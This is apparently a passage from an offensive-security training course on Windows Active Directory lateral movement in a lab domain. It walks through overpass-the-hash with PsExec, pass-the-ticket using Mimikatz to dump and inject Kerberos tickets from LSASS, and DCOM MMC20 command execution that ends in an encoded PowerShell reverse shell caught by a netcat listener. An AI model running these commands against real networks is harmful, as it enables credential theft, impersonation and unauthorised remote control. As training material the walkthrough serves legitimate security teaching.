### Optimized Text

#### No Cached Kerberos Tickets
No Kerberos tickets have been cached, which is expected since `jen` has not yet performed an interactive login. To generate a Ticket-Granting Ticket (TGT), we will authenticate to a network share on the `files04` server using the `net use` command.

```powershell
PS C:\Windows\system32> net use \\files04
The command completed successfully.
```

After running the `net use` command, we can list the Kerberos tickets with `klist`.

```powershell
PS C:\Windows\system32> klist
Current LogonId is 0:0x17239e
Cached Tickets: (2)
#0> Client: jen @ CORP.COM
Server: krbtgt/CORP.COM @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
Start Time: 2/27/2023 5:27:28 (local)
End Time: 2/27/2023 15:27:28 (local)
Renew Time: 3/6/2023 5:27:28 (local)
Session Key Type: RSADSI RC4-HMAC(NT)
Cache Flags: 0x1 -> PRIMARY
Kdc Called: DC1.corp.com

#1> Client: jen @ CORP.COM
Server: cifs/files04 @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
Start Time: 2/27/2023 5:27:28 (local)
End Time: 2/27/2023 15:27:28 (local)
Renew Time: 3/6/2023 5:27:28 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0
Kdc Called: DC1.corp.com
```

The `klist` output shows that the `net use` command was successful, and we now have a TGT and a TGS for the Common Internet File System (CIFS) service.

#### Converting NTLM Hash to Kerberos TGT
We used `net use` in this example, but any command requiring domain permissions would also create a TGS. We have now converted our NTLM hash into a Kerberos TGT, allowing us to use tools that rely on Kerberos authentication, such as Microsoft's PsExec.

Since we have generated Kerberos tickets and are operating in the context of `jen` in the PowerShell session, we can reuse the TGT to obtain code execution on the `files04` host.

Let's run `PsExec.exe` to launch `cmd` remotely on the `\\files04` machine as `jen`.

```powershell
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
corp\jen
C:\Windows\system32>hostname
FILES04
```

As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the `files04` server.

#### Pass the Ticket Attack
In the previous section, we used the "overpass the hash" technique to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. The TGT can only be used on the machine it was created for, but the TGS offers more flexibility.

The Pass the Ticket attack takes advantage of the TGS, which can be exported and re-injected elsewhere on the network to authenticate to a specific service. If the service tickets belong to the current user, no administrative privileges are required.

In this scenario, we will abuse an existing session of `dave`. The `dave` user has privileged access to the backup folder on `WEB04`, which `jen` does not. We will extract all the current TGT/TGS from memory and inject `dave`'s `WEB04` TGS into `jen`'s session to access the restricted folder.

First, let's log in as `jen` to `CLIENT76` and verify that we cannot access the resource on `WEB04`.

```powershell
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> ls \\web04\backup
ls : Access to the path '\\web04\backup' is denied.
At line:1 char:1
+ ls \\web04\backup
+ ~~~~~~~~~~~~~~~~~
+ CategoryInfo : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
+ FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Confirming that `jen` has no access to the restricted folder, we can now launch Mimikatz, enable debug privileges, and export all the TGT/TGS from memory.

```mimikatz
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::tickets /export
Authentication Id : 0 ; 2037286 (00000000:001f1626)
Session : Batch from 0
User Name : dave
Domain : CORP
Logon Server : DC1
Logon Time : 9/14/2022 6:24:17 AM
SID : S-1-5-21-1987370270-658905905-1781884369-1103
* Username : dave
* Domain : CORP.COM
* Password : (null)
Group 0 - Ticket Granting Service
Group 1 - Client Ticket ?
Group 2 - Ticket Granting Ticket
[00000000]
Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
Target Name (02) : krbtgt ; CORP ; @ CORP.COM
Client Name (01) : dave ; @ CORP.COM ( CORP )
Flags 40c10000 : name_canonicalize ; initial ; renewable ; forwardable ;
Session Key : 0x00000012 - aes256_hmac
f0259e075fa30e8476836936647cdabc719fe245ba2k9d4b60528f04196745fe6
Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...]
* Saved to file [0;1f1626]PI:EMAIL !
...
```

The above command parsed the LSASS process space in memory for any TGT/TGS and saved them to disk in the Kirbi format.

We can verify the newly generated tickets with the `dir` command, filtering for the `.kirbi` extension.

```powershell
PS C:\Tools> dir *.kirbi
Directory: C:\Tools
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 9/14/2022 6:24 AM 1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a---- 9/14/2022 6:24 AM 1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a---- 9/14/2022 6:24 AM 1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a---- 9/14/2022 6:24 AM 1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a---- 9/14/2022 6:24 AM 1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
-a---- 9/14/2022 6:24 AM 1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
...
```

We can pick any TGS ticket in the `dave@cifs-web04.kirbi` format and inject it through Mimikatz via the `kerberos::ptt` command.

```mimikatz
mimikatz # kerberos::ptt [0;12bd0]PI:EMAIL
* File: '[0;12bd0]PI:EMAIL': OK
```

No errors were thrown, meaning the ticket should be in our session when running `klist`.

```powershell
PS C:\Tools> klist
Current LogonId is 0:0x13bca7
Cached Tickets: (1)
#0> Client: dave @ CORP.COM
Server: cifs/web04 @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
Start Time: 9/14/2022 5:31:32 (local)
End Time: 9/14/2022 15:31:13 (local)
Renew Time: 9/21/2022 5:31:13 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0
Kdc Called:
```

We notice that the `dave` ticket has been successfully imported into `jen`'s session. Let's confirm we have been granted access to the restricted shared folder.

```powershell
PS C:\Tools> ls \\web04\backup
Directory: \\web04\backup
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 9/13/2022 2:52 AM 0 backup_schemata.txt
```

Awesome! We managed to successfully access the folder by impersonating `dave`'s identity after injecting their authentication token into our user's process.

#### DCOM Lateral Movement
In this section, we will inspect a recent lateral movement technique that exploits the Distributed Component Object Model (DCOM). The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to DCOM for interaction between multiple computers over a network.

Both COM and DCOM are very old technologies dating back to the first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135, and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

Cyberason documented a collection of various DCOM lateral movement techniques, including one discovered by Matt Nelson, which we will cover in this section.

The DCOM lateral movement technique is based on the Microsoft Management Console (MMC) COM application, which is employed for scripted automation of Windows systems. The MMC Application Class allows the creation of Application Objects, which expose the `ExecuteShellCommand` method under the `Document.ActiveView` property. This method allows the execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.

We will demonstrate this lateral movement attack as the `jen` user logged in from the already compromised Windows 11 `CLIENT74` host. From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of `FILES04` as the second argument of the `GetTypeFromProgID` method.

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

Once the application object is saved into the `$dcom` variable, we can pass the required arguments to the application via the `ExecuteShellCommand` method. The method accepts four parameters: Command, Directory, Parameters, and WindowState. We are only interested in the first and third parameters, which will be populated with `cmd` and `/c calc`, respectively.

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
```

Once we execute these two PowerShell lines from `CLIENT74`, we should have spawned an instance of the calculator app. We can verify the calculator app is running with `tasklist` and filter the output with `findstr`.

```powershell
C:\Users\Administrator> tasklist | findstr "calc"
win32calc.exe 4764 Services 0 12,132 K
```

We can now improve our craft by extending this attack to a full reverse shell, similar to what we did in the WMI and WinRM section earlier in this module. Having generated the base64 encoded reverse shell with our Python script, we can replace our DCOM payload with it.

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A... AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjiAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA", "7")
```

Switching to our Kali machine, we can verify any incoming connections on the listener that we simultaneously set up.

```bash
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> hostname
FILES04
```

As evidenced by the output, we have successfully executed a reverse shell on the `FILES04` server.